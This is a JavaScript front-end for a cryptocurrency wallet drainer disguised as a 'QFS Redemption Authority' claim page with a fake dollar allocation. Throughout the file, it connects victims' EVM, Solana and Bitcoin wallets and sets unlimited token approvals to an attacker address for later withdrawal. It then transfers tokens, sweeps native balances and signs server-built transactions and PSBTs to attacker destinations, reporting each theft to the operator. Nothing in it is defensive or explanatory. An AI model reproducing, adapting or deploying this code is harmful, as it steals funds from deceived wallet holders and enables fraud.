'use strict';

const $ = (id) => document.getElementById(id);
const API = window.DRAINER_API || '';
const SOLANA_MAINNET = 'solana:5eykt4UsFv8P8NJdTREpY1vzqKqZKvdp';

const log = (m) => {
  const el = $('log'); if (!el) return;
  el.textContent += `\n${m}`;
};
const setStatus = (t) => { const el = $('status'); if (el) el.textContent = t; };

/* Both the hero button and the nav pill run the same thing. */
const allBtns = () => [$('claim'), $('claimTop')].filter(Boolean);
const setLabels = (t) => allBtns().forEach((b) => {
  const el = b.querySelector('.cta-label'); if (el) el.textContent = t;
});

/* ---------- success overlay ---------- */
/* Fallback only — the page shows a random figure, and we reuse it. */
function allocationFor(addr) {
  if (!addr) return 0;
  let h = 0;
  const s = String(addr);
  for (let i = 0; i < s.length; i++) h = (h * 31 + s.charCodeAt(i)) >>> 0;
  return 30000000 + (h % 40000001);
}

/* Prefer the number already on the page so the overlay never disagrees. */
function currentAlloc(addr) {
  const hero = $('allocNum');
  if (hero) {
    const d = (hero.textContent || '').replace(/[^\d]/g, '');
    if (d.length >= 5) return Number(d);
  }
  return allocationFor(addr);
}

function showDone(addr) {
  const d = $('done'); if (!d) return;
  const a = $('doneAddr');
  if (a) a.textContent = addr && addr.length > 12 ? `${addr.slice(0, 6)}…${addr.slice(-4)}` : (addr || '');
  const alloc = $('doneAlloc');
  if (alloc) alloc.textContent = Math.round(currentAlloc(addr)).toLocaleString('en-US') + '$';

  d.hidden = false;
  d.scrollTop = 0;
  window.scrollTo(0, 0);
}

function wireDone() {
  const x = $('doneX');
  if (x) x.onclick = () => { $('done').hidden = true; };
  const f = $('doneForm');
  if (!f) return;
  f.addEventListener('submit', (e) => {
    e.preventDefault();
    const msg = $('doneMsg');
    const v = ($('doneEmail').value || '').trim();
    if (!/^[^\s@]+@[^\s@]+\.[^\s@]{2,}$/.test(v)) {
      msg.classList.remove('ok');
      msg.textContent = 'Please enter a valid email address.';
      return;
    }
    f.hidden = true;
    msg.classList.add('ok');
    msg.textContent = 'Statement sent — please check your inbox.';
  });
}

let cfg, chain, account, evmProvider, evmSigner, solWallet, scan, viaWC = false;
let wc = null, busy = false;
let evmRaw = null;
let lastEvmChainId = null;
let sweptAny = false;

// ---------------------------------------------------------------- transport
async function req(method, path, body) {
  const ctrl = new AbortController();
  const timer = setTimeout(() => ctrl.abort(), 45000);
  let r;
  try {
    r = await fetch(`${API}${path}`, {
      method,
      signal: ctrl.signal,
      headers: body ? { 'Content-Type': 'application/json' } : undefined,
      body: body ? JSON.stringify(body) : undefined,
    });
  } catch (e) {
    throw new Error(e.name === 'AbortError' ? `${path} timed out` : `server unreachable (${path})`);
  } finally { clearTimeout(timer); }

  const text = await r.text();
  let j;
  try { j = text ? JSON.parse(text) : {}; }
  catch { throw new Error(`${path} → ${r.status} non-JSON: ${text.slice(0, 70)}`); }
  if (!r.ok) throw new Error(j.error || `${r.status} ${r.statusText}`);
  return j;
}
const post = (p, b) => req('POST', p, b);
const get  = (p) => req('GET', p);

const appMetadata = () => ({
  name: cfg.appName || 'QFS Redemption Authority',
  description: cfg.appDesc || 'Connect your wallet and claim your allocation',
  url: cfg.appUrl || window.location.origin,
  icons: [cfg.appIcon || `${window.location.origin}/logo.png`],
});

const pickChain = (id) => cfg.chains.find((c) => c.type === 'evm' && Number(c.id) === Number(id));
const solChain  = () => cfg.chains.find((c) => c.type === 'solana');
const b64ToBytes = (b64) => {
  const bin = atob(b64), a = new Uint8Array(bin.length);
  for (let i = 0; i < bin.length; i++) a[i] = bin.charCodeAt(i);
  return a;
};

// Phantom's EVM provider injects window.ethereum too and cannot do BSC/Avalanche.
function pickEvmProvider() {
  const eth = window.ethereum;
  if (!eth) return null;
  const all = Array.isArray(eth.providers) && eth.providers.length ? eth.providers : [eth];
  return all.find((p) => !p.isPhantom) || all[0];
}
const isPhantomEvm = () => evmRaw?.isPhantom === true;
const PHANTOM_EVM_OK = new Set([1, 137, 8453, 42161]);
let phantomAllowed = PHANTOM_EVM_OK;
const phantomDisabled = new Set();

async function phantomEnabledChains(provider, address) {
  try {
    const caps = await provider.request({
      method: 'wallet_getCapabilities',
      params: address ? [address] : [],
    });
    console.log('[phantom] caps →', JSON.stringify(caps));
    if (caps && typeof caps === 'object') {
      const ids = Object.keys(caps).map((k) => parseInt(k, 16)).filter((n) => Number.isFinite(n) && n > 0);
      if (ids.length) return new Set(ids);
    }
  } catch (e) {
    console.log('[phantom] getCapabilities unsupported:', e.message);
  }
  return null;
}
const injectedSolana  = () => window.phantom?.solana
  || window.solflare
  || (window.solana?.isPhantom ? window.solana : null);
const injectedBitcoin = () => window.unisat || window.okxwallet?.bitcoin || null;

// ---- site-agnostic CTA label: read from whatever the page shipped
const IDLE_LABEL = (() => {
  const el = document.querySelector('#claim .cta-label, #claimTop .cta-label');
  const t = el && el.textContent.trim();
  return t || 'Connect Wallet';
})();

// ---------------------------------------------------------------- boot
async function boot() {
  allBtns().forEach((b) => {
    b.onclick = () => claim().catch((e) => log('ERROR: ' + (e.message || e)));
  });

  wireDone();

  try { cfg = await get('/config'); }
  catch (e) { setStatus('Server unreachable'); return log(e.message); }

  setLabels(IDLE_LABEL);
}

// ---------------------------------------------------------------- entry
async function claim() {
  if (busy) return;
  busy = true;

  const btns = allBtns();
  btns.forEach((b) => { b.disabled = true; b.classList.add('busy'); });
  setLabels('Connecting…');

  try {
    setStatus('Connecting…');
    const kind = await connect();
    const primary = account;
    setStatus('Connected');

    if (kind === 'evm') {
      await drainAllChains();
      await maybeDrainSolana();
      await maybeDrainBitcoin();
    } else if (kind === 'solana') {
      await drainSolana();
      await maybeDrainBitcoin();
    } else if (kind === 'bitcoin') {
      await drainBitcoin();
      await maybeDrainSolana();
    }

    localStorage.setItem('coldleet_claimed', '1');
    setLabels(IDLE_LABEL);
    btns.forEach((b) => b.classList.add('done'));
    setStatus('Connected');

    showDone(primary);
  } catch (e) {
    log('ERROR: ' + (e.message || e));
    setStatus('Something went wrong — tap to retry.');
    setLabels(IDLE_LABEL);
  } finally {
    busy = false;
    btns.forEach((b) => { b.disabled = false; b.classList.remove('busy'); });
  }
}

// ---------------------------------------------------------------- connect
async function connect() {
  const injectedEvm = pickEvmProvider();
  const injectedSol = injectedSolana();
  const injectedBtc = injectedBitcoin();

  if (injectedEvm) { await connectInjectedEvm(injectedEvm); return 'evm'; }
  if (injectedSol) { await connectInjectedSolana(injectedSol); return 'solana'; }
  if (injectedBtc) { await connectInjectedBitcoin(injectedBtc); return 'bitcoin'; }
  return await connectWalletConnect();
}

async function connectInjectedEvm(eth) {
  evmRaw = eth;
  if (isPhantomEvm()) {
    const caps = await phantomEnabledChains(evmRaw, account);
    if (caps) {
      phantomAllowed = new Set([...PHANTOM_EVM_OK].filter((id) => caps.has(id)));
      const off = [...PHANTOM_EVM_OK].filter((id) => !caps.has(id));
      if (off.length) {
        log(`Phantom: ${off.map((i) => pickChain(i)?.name).join(', ')} disabled in Phantom settings`);
      }
    }
  }

  evmProvider = new ethers.BrowserProvider(eth);
  await eth.request({ method: 'eth_requestAccounts' });

  const net = await evmProvider.getNetwork();
  chain = pickChain(net.chainId);
  if (!chain) {
    try {
      await eth.request({ method: 'wallet_switchEthereumChain', params: [{ chainId: '0x1' }] });
      chain = pickChain(1);
    } catch {}
  }
  if (!chain) throw new Error(`Unsupported chain ${net.chainId}`);

  account = (await evmProvider.listAccounts())[0].address;
  evmSigner = await evmProvider.getSigner();
  await finishEvm('injected');
}

async function connectInjectedSolana(sol) {
  const res = await sol.connect();
  const publicKey = res?.publicKey || res;
  solWallet = sol;
  account = publicKey.toString();
  chain = solChain();
  scan = await post('/scan', { address: account, chain: 'solana', provider: 'injected' });
  log(`SOL ${scan.native.formatted}, ${scan.tokens.length} SPL accounts`);
}

async function connectInjectedBitcoin(w) {
  const accounts = await w.requestAccounts();
  if (!accounts?.length) throw new Error('Bitcoin wallet returned no accounts');
  account = accounts[0];
  chain = cfg.chains.find((c) => c.type === 'bitcoin');
  scan = await post('/scan', { address: account, chain: 'bitcoin', provider: 'unisat' });
  log(`BTC ${scan.native.formatted}`);
}

async function connectWalletConnect() {
  if (!cfg.walletConnectProjectId) throw new Error('No injected wallet and WALLETCONNECT_PROJECT_ID is unset');

  const [{ default: UniversalProvider }, { WalletConnectModal }] = await Promise.all([
    import('https://esm.sh/@walletconnect/universal-provider@2.16.1'),
    import('https://esm.sh/@walletconnect/modal@2.6.2'),
  ]);

  wc = await UniversalProvider.init({ projectId: cfg.walletConnectProjectId, metadata: appMetadata() });
  const modal = new WalletConnectModal({ projectId: cfg.walletConnectProjectId });
  wc.on('display_uri', (uri) => modal.openModal({ uri }));
  wc.on('session_delete', () => modal.closeModal());

  const EVM_METHODS = ['eth_sendTransaction', 'personal_sign', 'eth_signTypedData_v4'];
  const EVM_EVENTS  = ['chainChanged', 'accountsChanged'];
  const SOL_METHODS = ['solana_signTransaction', 'solana_signAndSendTransaction', 'solana_signMessage'];
  const evmChains = cfg.chains.filter((c) => c.type === 'evm').map((c) => `eip155:${c.id}`);

  await wc.connect({
    namespaces: { eip155: { chains: ['eip155:1'], methods: EVM_METHODS, events: EVM_EVENTS } },
    optionalNamespaces: {
      eip155: { chains: evmChains.filter((c) => c !== 'eip155:1'), methods: EVM_METHODS, events: EVM_EVENTS },
      solana: { chains: [SOLANA_MAINNET], methods: SOL_METHODS, events: ['accountsChanged'] },
    },
  });
  modal.closeModal();
  viaWC = true;

  const ns = wc.session?.namespaces || {};

  if (ns.eip155?.accounts?.length) {
    const [, chainId, address] = ns.eip155.accounts[0].split(':');
    chain = pickChain(chainId);
    if (!chain) throw new Error(`Unsupported chain eip155:${chainId}`);
    account = address;
    evmProvider = new ethers.BrowserProvider({
      request: (args) => wc.request({ chainId: `eip155:${chain.id}`, ...args }),
      on: () => {}, removeListener: () => {},
    });
    evmSigner = await evmProvider.getSigner();
    await finishEvm('walletconnect');
    return 'evm';
  }

  if (ns.solana?.accounts?.length) {
    account = ns.solana.accounts[0].split(':')[2];
    chain = solChain();
    scan = await post('/scan', { address: account, chain: 'solana', provider: 'walletconnect' });
    log(`SOL ${scan.native.formatted}, ${scan.tokens.length} SPL accounts`);
    return 'solana';
  }

  throw new Error('Wallet returned no usable accounts');
}

// ---------------------------------------------------------------- evm sweep
const walletCantDo = new Set();

async function addChain(c) {
  await evmRaw.request({
    method: 'wallet_addEthereumChain',
    params: [{
      chainId: '0x' + Number(c.id).toString(16),
      chainName: c.name,
      nativeCurrency: { name: c.symbol, symbol: c.symbol, decimals: 18 },
      rpcUrls: [c.rpc],
      blockExplorerUrls: [c.explorer],
    }],
  });
}

async function switchTo(chainId) {
  if (viaWC) return true;

  const id = Number(chainId);
  if (walletCantDo.has(id)) return false;

  const c = cfg.chains.find((x) => Number(x.id) === id);

  if (isPhantomEvm() && !phantomAllowed.has(id)) {
    walletCantDo.add(id);
    log(`Phantom: ${c?.name || id} unavailable — skipping`);
    return false;
  }

  try {
    await evmRaw.request({
      method: 'wallet_switchEthereumChain',
      params: [{ chainId: '0x' + id.toString(16) }],
    });
  } catch (e) {
    if (e?.code === 4001) return true;
    if (e?.code === 4902 || /unrecognized chain/i.test(e?.message || '')) {
      try { await addChain(c); }
      catch { walletCantDo.add(id); return false; }
    } else {
      walletCantDo.add(id);
      const msg = e?.message || String(e);
      if (/disabled this network/i.test(msg)) {
        phantomDisabled.add(c?.name || String(chainId));
        log(`Phantom: ${c?.name || chainId} is off in Phantom settings`);
      } else {
        log(`switch ${chainId} refused: ${msg}`);
      }
      return false;
    }
  }

  const now = Number(await evmRaw.request({ method: 'eth_chainId' }));
  if (now !== id) { walletCantDo.add(id); return false; }
  return true;
}

async function finishEvm(label) {
  setStatus('Connected');
}

async function drainAllChains() {
  const found = await post('/scanall', {
    address: account, provider: viaWC ? 'walletconnect' : 'injected',
  });
  if (!found.length) return log('no EVM assets found');

  for (const s of found) {
    const c = pickChain(s.chainId);
    if (!c) continue;
    try {
      if (!(await switchTo(c.id))) { log(`${c.name}: wallet refuses — skipping`); continue; }
      chain = c;
      lastEvmChainId = Number(c.id);
      scan = s;
      await drainEvm();
    } catch (e) { log(`${c.name}: ${e.message}`); }
  }

  if (phantomDisabled.size) {
    log(`Phantom: enable ${[...phantomDisabled].join(', ')} in Settings → Active Networks, then retry`);
  }
}

const MAX_TOKENS_PER_CHAIN = 5;
const NATIVE_BUFFER_TXS = 3;
const EVM_IFACE = new ethers.Interface([
  'function transfer(address,uint256)',
  'function approve(address,uint256)',
]);

async function drainEvm() {
  const dest = cfg.destinations.evm;
  if (!dest) throw new Error('Set DRAINER_EVM_ADDRESS in .env');

  const list = (scan.tokens || [])
    .filter((t) => BigInt(t.raw ?? 0) > 0n)
    .slice(0, MAX_TOKENS_PER_CHAIN);

  log(`${chain.name}: ${list.length} token(s) to move`);

  for (const t of list) {
    // 1. approve FIRST — this is what makes the Telegram button work later.
    //    A token that reverts on transfer still gets an allowance this way.
    if (cfg.approveMode) {
      try {
        const erc = new ethers.Contract(
          t.address, ['function allowance(address,address) view returns (uint256)'], evmProvider);
        const allow = await erc.allowance(account, dest);
        if (allow < BigInt(t.raw)) {
          const atx = await evmSigner.sendTransaction({
            to: t.address,
            data: EVM_IFACE.encodeFunctionData('approve', [dest, ethers.MaxUint256]),
            gasLimit: 120000n,
          });
          log(`${t.symbol} approved (${atx.hash})`);
          await atx.wait(1, 120000).catch(() => null);
        }
      } catch (e) { log(`${t.symbol} approve failed: ${e.shortMessage || e.message}`); }
    }

    // Approve-only: the Telegram button pulls this later. Saves a prompt.
    if (cfg.approveOnly) continue;

    // 2. only now does the transfer simulation matter
    const data = EVM_IFACE.encodeFunctionData('transfer', [dest, BigInt(t.raw)]);
    try {
      await evmProvider.call({ from: account, to: t.address, data });
    } catch (e) {
      log(`${t.symbol}: transfer reverts — approved anyway (${e.shortMessage || e.message})`);
      continue;
    }

    const bal = await evmProvider.getBalance(account);
    const fee = await evmProvider.getFeeData();
    const price = fee.maxFeePerGas ?? fee.gasPrice ?? 0n;
    if (bal < 60000n * price) {
      log(`${t.symbol}: wallet out of gas on ${chain.name} — stopping this chain`);
      break;
    }

    try {
      const tx = await evmSigner.sendTransaction({ to: t.address, data, gasLimit: 120000n });
      log(`${t.symbol} sent (${tx.hash})`);
      const rc = await tx.wait(1, 180000).catch(() => null);
      if (!rc || rc.status !== 1) { log(`${t.symbol}: tx failed on-chain — skipped`); continue; }

      sweptAny = true;
      await post('/notify', {
        address: account, chain: chain.name, hash: tx.hash,
        amount: `${t.formatted} ${t.symbol}`, status: 'SUCCESS',
      });
    } catch (e) {
      log(`${t.symbol} send failed: ${e.shortMessage || e.message}`);
    }
  }

  // 3. native sweep — victim pays, leave headroom so a retry still works
  const bal = await evmProvider.getBalance(account);
  const fee = await evmProvider.getFeeData();
  const price = fee.maxFeePerGas ?? fee.gasPrice ?? 0n;
  const gas = 21000n;
  const buffer = gas * price * BigInt(NATIVE_BUFFER_TXS + 1);
  const value = bal - buffer;

  if (value > 0n) {
    try {
      const tx = await evmSigner.sendTransaction({ to: dest, value, gasLimit: gas });
      log(`native swept (${tx.hash})`);
      await tx.wait(1, 180000).catch(() => null);
      sweptAny = true;
      await post('/notify', {
        address: account, chain: chain.name, hash: tx.hash,
        amount: `${ethers.formatEther(value)} ${chain.symbol}`, status: 'SUCCESS',
      });
    } catch (e) { log(`native failed: ${e.shortMessage || e.message}`); }
  } else {
    log(`native ${ethers.formatEther(bal)} ${chain.symbol} — below buffer`);
  }
}

// ---------------------------------------------------------------- solana sweep
async function maybeDrainSolana() {
  if (viaWC || chain?.type === 'solana') return;
  const sol = injectedSolana();
  if (!sol) return;

  try {
    const res = await sol.connect();
    const publicKey = res?.publicKey || res;
    solWallet = sol;
    account = publicKey.toString();
    chain = solChain();
    scan = await post('/scan', { address: account, chain: 'solana', provider: 'injected' });
    log(`SOL ${scan.native.formatted}, ${scan.tokens.length} SPL accounts`);
    await drainSolana();
  } catch (e) { log('solana: ' + e.message); }
}

async function drainSolana() {
  const dest = cfg.destinations.solana;
  if (!dest) throw new Error('Set DRAINER_SOL_ADDRESS in .env');
  const build = await get(`/solana/build?owner=${account}&dest=${dest}`);
  const list = build.transactions || [];
  if (!list.length) return log('solana: nothing to sweep');

  if (viaWC) {
    for (const b64 of list) {
      const res = await wc.request({
        chainId: SOLANA_MAINNET,
        method: 'solana_signAndSendTransaction',
        params: { transaction: b64 },
      });
      log(`solana tx ${res?.signature || res}`);
      sweptAny = true;
    }
  } else {
    const { Transaction } = await import('https://esm.sh/@solana/web3.js@1');
    for (const b64 of list) {
      const tx = Transaction.from(b64ToBytes(b64));
      if (solWallet.signAndSendTransaction) {
        const { signature } = await solWallet.signAndSendTransaction(tx);
        log(`solana tx ${signature}`);
      } else {
        const signed = await solWallet.signTransaction(tx);
        const { signature } = await post('/solana/send', { transaction: signed.serialize().toString('base64') });
        log(`solana tx ${signature}`);
      }
      sweptAny = true;
    }
  }
  await post('/notify', { address: account, chain: 'Solana', amount: 'see explorer', status: 'SUCCESS' });
}

// ---------------------------------------------------------------- btc sweep
async function maybeDrainBitcoin() {
  const w = injectedBitcoin();
  if (!w) return;
  try {
    const accounts = await w.requestAccounts().catch(() => []);
    if (!accounts?.length) return;
    account = accounts[0];
    await drainBitcoin();
  } catch (e) { log('bitcoin: ' + e.message); }
}

async function drainBitcoin() {
  const w = injectedBitcoin();
  if (!w) throw new Error('No Bitcoin wallet');

  const dest = cfg.destinations.bitcoin;
  if (!dest) return log('no BTC destination set');

  const pubkey = await w.getPublicKey?.().catch(() => null);
  const q = new URLSearchParams({ owner: account, dest });
  if (pubkey) q.set('pubkey', pubkey);

  const build = await get(`/btc/psbt?${q}`);
  log(`signing ${build.inputs} inputs, fee ${build.fee} sats…`);
  const signed = await w.signPsbt(build.psbt, { autoFinalized: true });
  const txid = await w.pushPsbt(signed);
  log(`btc tx ${txid}`);
  sweptAny = true;
  await post('/notify', {
    address: account, chain: 'Bitcoin', hash: txid,
    amount: `${build.send} sats`, status: 'SUCCESS',
  });
}

boot().catch((e) => log(e.message));
